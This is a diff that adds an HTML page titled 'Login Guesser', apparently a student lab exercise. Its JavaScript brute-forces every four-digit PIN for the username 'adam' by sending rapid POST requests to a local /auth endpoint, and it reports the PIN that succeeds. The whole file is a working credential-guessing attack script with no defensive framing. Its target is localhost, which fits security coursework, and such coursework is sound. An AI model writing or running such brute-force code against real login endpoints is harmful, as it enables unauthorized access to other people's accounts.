@@ -1,0 +1,55 @@
+<html>
+	<head>
+		<title>Login Guesser</title>
+	</head>
+	<body>
+        <h1>Hit start to begin the guessing process.</h1>
+        <form action="/auth" method="post">
+            Username: <input type="text" name="name" id="name" value="adam" readonly="true"/> <br>
+            Pin: <input type="text" name="pin" id="pin" /> <br>
+            <input type="button" value="START" onclick="doLogin()">
+        </form>
+	</body>
+</html>
+<script>
+   function doLogin() {
+   //check the endpoint
+    const myHostURL = "http://localhost/auth";
+    console.log("starting test ");
+	
+    for (let i = 0; i <= 9999; i++) { //set i to be zero, i less than/equal to 9999, counter
+        const pin = String(i).padStart(4, '0'); // for doing the padding
+		
+		//setTimeout sets delays between each loop, 10 miliseconds each. needed to add this cause my vm was loading everything at once lol
+		//and when i did further testing (set test pin the 3456) it wouldn't register all the numbers and it would skip 3456
+        setTimeout(() => { 
+            let Mydata = {
+                username: document.getElementById("name").value,
+                pin: pin, //it wouldn't let me declare the padding as a getElementById thing for some reason?? oh well
+            };
+
+            let requestSettings = {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify(Mydata),
+            };
+
+            fetch(myHostURL, requestSettings)
+                .then(response => {
+                    if (response.status === 200) { // Check if response status is 200
+                        console.log(`Success with PIN: ${pin}`); // display succesful pin, sidenote these variable calls won't work with ' ' ??? they have to be ticks. weird
+                        document.getElementById("pin").value = pin; // puts correct pin in the pin box
+                    } else {
+                        console.log(`Failed with PIN: ${pin}`); // display bad pin
+                    }
+                })
+                .catch(error => {
+                    console.error("ERROR!!!!: ", error);
+                });
+        }, i * 10); //the 10 milli, goes based on how many loops there are
+    }
+    console.log("test COMPLETE\n");
+}
+</script>
